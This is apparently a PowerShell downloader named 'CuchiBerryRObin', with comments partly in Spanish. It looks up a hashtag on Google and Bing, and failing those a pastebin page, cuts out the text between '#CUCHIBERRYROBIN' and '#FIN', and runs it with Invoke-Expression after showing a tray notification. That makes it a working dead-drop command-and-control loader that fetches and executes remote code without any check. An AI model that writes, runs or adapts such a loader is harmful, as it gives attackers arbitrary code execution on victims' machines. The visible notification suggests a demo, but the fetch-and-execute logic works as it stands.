#Downloader CUCHIBERRYROBIN
$Conf_Hashtag_init="#CUCHIBERRYROBIN"
$Conf_Hashtag_end="#FIN"

#Not working, need workaround to get from google 
$content = Invoke-WebRequest -Uri "https://www.google.com/search?q=$Conf_Hashtag_init" -UseBasicParsing
$patron = '(?<=$Conf_Hashtag_init )(.*)(?= $Conf_Hashtag_end)'
$resultado = [regex]::Match($content.Content, $patron).Value

#Bun BING WORKS!!!
#Pero OPCION #TODO CIPHER XOR
if (([string]::IsNullOrEmpty($resultado)))
{
$conf_hashtag_init_encoded = [System.Uri]::EscapeDataString($Conf_Hashtag_init)
$content = Invoke-WebRequest -Uri "https://www.bing.com/search?q=$conf_hashtag_init_encoded" -UseBasicParsing
$patron = "(?<=$Conf_Hashtag_init\s)(.*?)(?=\s*$Conf_Hashtag_end)"
$resultado = ($content | Select-String -Pattern $patron -AllMatches).Matches[0].Value
}



#TerceraA OPCION #TODO CIPHER XOR
if (([string]::IsNullOrEmpty($resultado)))
{
$content = Invoke-WebRequest -Uri "https://pastebin.com/ABiV0rH7" -UseBasicParsing
$patron = '(?<=#CUCHIROBIN )(.*)(?= #FIN)'
$resultado = [regex]::Match($content, $patron).Value
}



$Title = "CuchiBerryRObin"
$Message = "Descargando comando $resultado"
$Type = "info" 
  
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)
Invoke-Expression $resultado



